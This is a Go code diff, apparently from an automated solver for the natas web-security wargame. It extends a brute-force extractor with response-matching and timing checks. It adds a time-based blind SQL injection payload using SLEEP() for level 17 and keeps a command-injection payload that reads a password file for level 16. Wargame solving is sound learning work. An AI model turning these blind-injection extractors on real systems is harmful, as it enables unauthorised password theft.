@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"time"
 
 	xmlpath "gopkg.in/xmlpath.v2"
 
@@ -268,14 +269,15 @@ func (c Combine) Grab(r http.Request) string {
 }
 
 type BruteForce struct {
-	Field, Prefix, Suffix, First, Wildcard, Fail string
+	Field, Prefix, Suffix, First, Wildcard string
+	Grabber
 }
 
 func (s BruteForce) Grab(r http.Request) string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
 	var (
 		p = Post{
-			grab,
+			s.Grabber,
 			SetData{s.Field: nil},
 			nil,
 		}
@@ -284,7 +286,7 @@ func (s BruteForce) Grab(r http.Request) string {
 
 	for _, c := range chars {
 		p.Data[s.Field] = Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix}
-		if !strings.Contains(p.Grab(r), s.Fail) {
+		if p.Grab(r) == "1" {
 			knownChars += string(c)
 		}
 	}
@@ -292,13 +294,39 @@ Loop:
 	for {
 		for _, c := range knownChars {
 			p.Data[s.Field] = Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix}
-			if !strings.Contains(p.Grab(r), s.Fail) {
+			if p.Grab(r) == "1" {
 				result += string(c)
 				continue Loop
 			}
 		}
 		return result
 	}
+}
+
+type NotContain struct {
+	Grabber
+	NotMatch string
+}
+
+func (n NotContain) Grab(r http.Request) string {
+	if !strings.Contains(n.Grabber.Grab(r), n.NotMatch) {
+		return "1"
+	}
+	return "0"
+}
+
+type TakesTime struct {
+	Grabber
+	time.Duration
+}
+
+func (t TakesTime) Grab(r http.Request) string {
+	start := time.Now()
+	t.Grabber.Grab(r)
+	if time.Now().Sub(start) > t.Duration {
+		return "1"
+	}
+	return "0"
 }
 
 var levels = [...]Grabber{
@@ -423,7 +451,7 @@ var levels = [...]Grabber{
 		"",
 		"",
 		"%",
-		"This user doesn't exist.",
+		NotContain{grab, "This user doesn't exist."},
 	},
 	//level 16
 	BruteForce{
@@ -432,7 +460,16 @@ var levels = [...]Grabber{
 		" /etc/natas_webpass/natas17)African",
 		"^",
 		".*",
-		"African",
+		NotContain{grab, "African"},
+	},
+	//level 17
+	BruteForce{
+		"username",
+		"natas18\" AND IF (password LIKE BINARY \"",
+		"\", SLEEP(1), null) AND password != \"",
+		"",
+		"%",
+		TakesTime{grab, time.Second},
 	},
 }
 
